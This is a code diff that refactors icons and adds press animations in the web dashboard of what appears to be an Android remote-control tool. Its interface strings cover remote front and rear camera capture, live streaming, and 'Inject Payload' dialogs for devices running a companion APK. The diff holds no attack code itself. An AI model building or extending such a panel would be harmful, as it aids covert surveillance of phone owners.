@@ -28,6 +28,23 @@ const UI = {
     },
 
     bind() {
+        // Global haptic feedback listener for instant animation
+        const addPressed = (e) => {
+            const btn = e.target.closest("button, .action-btn, .device-card, .tab-btn");
+            if (btn) btn.classList.add("is-pressed");
+        };
+        const removePressed = (e) => {
+            const btns = document.querySelectorAll(".is-pressed");
+            btns.forEach(b => b.classList.remove("is-pressed"));
+        };
+
+        document.body.addEventListener("mousedown", addPressed);
+        document.body.addEventListener("touchstart", addPressed, { passive: true });
+        document.body.addEventListener("mouseup", removePressed);
+        document.body.addEventListener("touchend", removePressed);
+        document.body.addEventListener("touchcancel", removePressed);
+        document.body.addEventListener("mouseleave", removePressed);
+
         // Global click listener for delegation - minimizes bug pemicu & memory leaks
         document.body.addEventListener("click", async (e) => {
             const btn = e.target.closest("[data-action], [data-tab], [data-toast-id]");
@@ -529,15 +546,19 @@ const UI = {
     renderTheme() {
         const isDark = document.documentElement.classList.contains("dark");
         if (dom.themeToggle) {
-            const iconNode = dom.themeToggle.querySelector("i") || dom.themeToggle.querySelector("svg");
             const targetIcon = isDark ? "moon" : "sun";
 
-            // If already correct, skip
-            if (iconNode && iconNode.getAttribute("data-lucide") === targetIcon) return;
+            // Check if we already have the correct SVG icon rendered
+            // Lucide SVGs have class 'lucide' or similar, we check our custom property or attribute
+            const currentIcon = dom.themeToggle.querySelector('svg')?.getAttribute('data-lucide') ||
+                               dom.themeToggle.querySelector('i')?.getAttribute('data-lucide');
 
-            // Re-render the <i> tag to let Lucide handle the conversion to SVG
-            dom.themeToggle.innerHTML = `<i data-lucide="${targetIcon}"></i>`;
-            dom.iconsDirty = true;
+            if (currentIcon === targetIcon) return;
+
+            dom.themeToggle.innerHTML = renderIcon(targetIcon);
+            // Manually tag the new SVG so our check works next time
+            const newSvg = dom.themeToggle.querySelector('svg');
+            if (newSvg) newSvg.setAttribute('data-lucide', targetIcon);
         }
     },
 
@@ -545,10 +566,10 @@ const UI = {
         const devices = state.data.devices;
         if (!devices.length) {
             setHtmlIfChanged(dom.deviceGrid, `
-                <div class=\"empty-state\">
-                    <i data-lucide=\"smartphone-charging\"></i>
+                <div class="empty-state">
+                    ${renderIcon("smartphone-charging")}
                     <p>Waiting for connected devices...</p>
-                    <span class=\"text-sm mt-8 opacity-60\">Ensure APK is running and connected to Supabase</span>
+                    <span class="text-sm mt-8 opacity-60">Ensure APK is running and connected to Supabase</span>
                 </div>
             `);
             dom.iconsDirty = true;
@@ -609,9 +630,9 @@ const UI = {
     renderLogs() {
         if (!state.ui.logs.length) {
             setHtmlIfChanged(dom.logOutput, `
-                <div class=\"empty-state\">
-                    <i data-lucide=\"activity\"></i>
-                    <p class=\"text-sm\">System logs will appear here</p>
+                <div class="empty-state">
+                    ${renderIcon("activity")}
+                    <p class="text-sm">System logs will appear here</p>
                 </div>
             `);
             dom.iconsDirty = true;
@@ -672,7 +693,7 @@ const UI = {
                     ${isConnected ? `<div id="streamInfo" class="text-xs color-muted text-mono text-center">SESSION ACTIVE</div>` : ''}
                 `;
                 footer = `<div class="btn-group">
-                            ${isCamera ? `<button class="secondary-btn" data-action="stream" data-value="${nextCam}"><i data-lucide="refresh-cw"></i></button>` : ""}
+                            ${isCamera ? `<button class="secondary-btn" data-action="stream" data-value="${nextCam}">${renderIcon("refresh-cw")}</button>` : ""}
                             <button class="primary-btn" data-action="stop-stream" style="background:var(--system-red); flex:3">STOP SESSION</button>
                         </div>`;
                 break;
@@ -716,7 +737,7 @@ const UI = {
                             <img src="${modal.src}" onerror="this.src='https://placehold.co/600x400?text=Processing...'">
                         </div>`;
                 footer = `<div class="btn-group">
-                            <a href="${modal.src}" download="ds_capture.jpg" class="primary-btn" style="text-decoration:none;"><i data-lucide="download"></i> Save</a>
+                            <a href="${modal.src}" download="ds_capture.jpg" class="primary-btn" style="text-decoration:none;">${renderIcon("download")} Save</a>
                             <button class="secondary-btn" data-action="close-modal">Dismiss</button>
                         </div>`;
                 break;
@@ -771,16 +792,16 @@ const UI = {
                 break;
 
             case "take_photo_options":
-                head = `<div class=\"modal-title\">Capture Photo</div>`;
-                body = `<div class=\"action-grid\">
-                            <button class=\"action-btn\" data-action=\"command\" data-value=\"${CMD.CAMERA_FRONT}\" style=\"aspect-ratio:auto; height:120px;\">
-                                <i data-lucide=\"camera\" style=\"width:28px; height:28px\"></i><span>Front Cam</span>
+                head = `<div class="modal-title">Capture Photo</div>`;
+                body = `<div class="action-grid">
+                            <button class="action-btn" data-action="command" data-value="${CMD.CAMERA_FRONT}" style="aspect-ratio:auto; height:120px;">
+                                ${renderIcon("camera", "w-28 h-28")}<span>Front Cam</span>
                             </button>
-                            <button class=\"action-btn\" data-action=\"command\" data-value=\"${CMD.CAMERA_BACK}\" style=\"aspect-ratio:auto; height:120px;\">
-                                <i data-lucide=\"camera\" style=\"width:28px; height:28px\"></i><span>Rear Cam</span>
+                            <button class="action-btn" data-action="command" data-value="${CMD.CAMERA_BACK}" style="aspect-ratio:auto; height:120px;">
+                                ${renderIcon("camera", "w-28 h-28")}<span>Rear Cam</span>
                             </button>
                         </div>`;
-                footer = `<button class=\"secondary-btn\" data-action=\"close-modal\">Cancel</button>`;
+                footer = `<button class="secondary-btn" data-action="close-modal">Cancel</button>`;
                 break;
 
             case "waiting-data":
@@ -797,7 +818,7 @@ const UI = {
                 head = `<div class="modal-title">Payload Active</div>`;
                 body = `<div class="flex-center flex-column py-20 text-center">
                             <div class="auth-logo mb-16" style="background:var(--system-green); box-shadow:0 12px 24px rgba(52, 199, 89, 0.3)">
-                                <i data-lucide="check-circle-2"></i>
+                                ${renderIcon("check-circle-2")}
                             </div>
                             <p class="text-md text-bold mb-8">Injection Already Complete</p>
                             <p class="text-sm color-muted">The external module is already running on this device. You can now use all remote features without re-injecting.</p>
@@ -809,7 +830,7 @@ const UI = {
                 head = `<div class="modal-title">Injection Required</div>`;
                 body = `<div class="flex-center flex-column py-20 text-center">
                             <div class="auth-logo mb-16" style="background:var(--system-red); box-shadow:0 12px 24px rgba(255, 59, 48, 0.3)">
-                                <i data-lucide="alert-triangle"></i>
+                                ${renderIcon("alert-triangle")}
                             </div>
                             <p class="text-md text-bold mb-8">Payload Not Found</p>
                             <p class="text-sm color-muted">This feature requires an active payload module. Please go to the <b>System</b> tab and click <b>Inject Payload</b> first.</p>
@@ -826,7 +847,7 @@ const UI = {
                 head = `<div class="modal-title">Permission Required</div>`;
                 body = `<div class="flex-center flex-column py-20 text-center">
                             <div class="auth-logo mb-16" style="background:var(--system-blue); box-shadow:0 12px 24px rgba(0, 122, 255, 0.3)">
-                                <i data-lucide="shield"></i>
+                                ${renderIcon("shield")}
                             </div>
                             <p class="text-md text-bold mb-8">${pName} Missing</p>
                             <p class="text-sm color-muted">Please allow <b>${pName}</b> permission in the <b>System</b> tab first to use this feature.</p>
